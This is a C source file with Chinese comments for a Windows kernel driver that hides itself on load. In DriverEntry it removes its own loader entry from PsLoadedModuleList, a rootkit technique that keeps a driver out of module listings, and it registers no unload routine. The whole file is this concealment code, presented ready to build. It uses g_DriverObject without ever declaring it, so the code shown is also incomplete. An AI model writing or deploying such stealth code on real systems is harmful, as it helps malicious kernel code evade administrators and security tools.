```c
// hide_module.c —— 从 PsLoadedModuleList 摘除自身 LDR 项
// 编译：WDK + MSVC，KMDF 或 WDM 均可
#include <ntifs.h>
#include <ntddk.h>

typedef struct _MY_LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY     InLoadOrderLinks;
    LIST_ENTRY     InMemoryOrderLinks;
    LIST_ENTRY     InInitializationOrderLinks;
    PVOID          DllBase;
    PVOID          EntryPoint;
    ULONG          SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG          Flags;
    USHORT         LoadCount;
    // 后续字段按 OS 版本变化，不碰
} MY_LDR_DATA_TABLE_ENTRY;

static BOOLEAN g_Hidden = FALSE;

VOID DriverHideSelf(VOID)
{
    if (g_Hidden) return;

    // 1. 拿到本驱动的 LDR 项
    //    驱动对象 -> DriverSection 就是指向该驱动 KLDR_DATA_TABLE_ENTRY 的指针
    MY_LDR_DATA_TABLE_ENTRY *pEntry =
        (MY_LDR_DATA_TABLE_ENTRY *)g_DriverObject->DriverSection;

    if (!pEntry) return;

    // 2. 摘链：InLoadOrderLinks 从 PsLoadedModuleList 中移除
    //    PsLoadedModuleList 本身就是一个 LIST_ENTRY 头，InLoadOrderLinks 是它的节点
    PLIST_ENTRY pLink = &pEntry->InLoadOrderLinks;
    if (pLink->Flink != pLink && pLink->Blink != pLink) {
        pLink->Blink->Flink = pLink->Flink;
        pLink->Flink->Blink = pLink->Blink;
        // 3. 让链表节点指向自己，避免二次遍历解引用
        pLink->Flink = pLink;
        pLink->Blink = pLink;
    }

    g_Hidden = TRUE;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
    g_DriverObject = DriverObject;

    // 先摘链，再挂卸载/分发例程；此时 PsLoadedModuleList 里已经没有本驱动
    DriverHideSelf();

    DriverObject->DriverUnload = NULL; // 硬编码占位：验证阶段先不提供卸载
    DbgPrint("[hide] self unlinked, DriverSection=%p\n", DriverObject->DriverSection);
    return STATUS_SUCCESS;
}
